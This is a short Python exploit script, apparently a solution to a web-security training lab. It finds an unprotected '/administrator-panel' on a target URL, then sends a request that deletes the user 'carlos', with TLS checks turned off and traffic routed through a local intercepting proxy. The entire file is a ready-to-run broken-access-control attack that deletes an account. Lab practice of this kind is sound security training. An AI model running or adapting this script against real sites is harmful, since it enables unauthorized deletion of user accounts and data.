import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def delete_user(url):
    admin_panel_url = url + "/administrator-panel"
    r = requests.get(admin_panel_url, proxies=proxies, verify=False)
    if r.status_code == 200:
        print("(+) Admin panel found at: %s" % admin_panel_url)
        # Here you would add the logic to delete the user, e.g., by sending a POST request with the appropriate parameters.
        print("(+) Deleting user 'carlos'...")
        delete_carlos_url = admin_panel_url + "/delete?username=carlos"
        r = requests.get(delete_carlos_url, proxies=proxies, verify=False)
        if r.status_code == 200:
            print("(+) User 'carlos' deleted successfully.")
        else:
            print("(-) Failed to delete user 'carlos'. Status code: %d" % r.status_code)
    else:
        print("(-) Admin panel not found. Status code: %d" % r.status_code)
        print("(-) Exiting the script.")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <URL>" % sys.argv[0])
        print("(+) Example: %s https://example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Finding admin ")
    delete_user(url)

if __name__ == "__main__":
    main()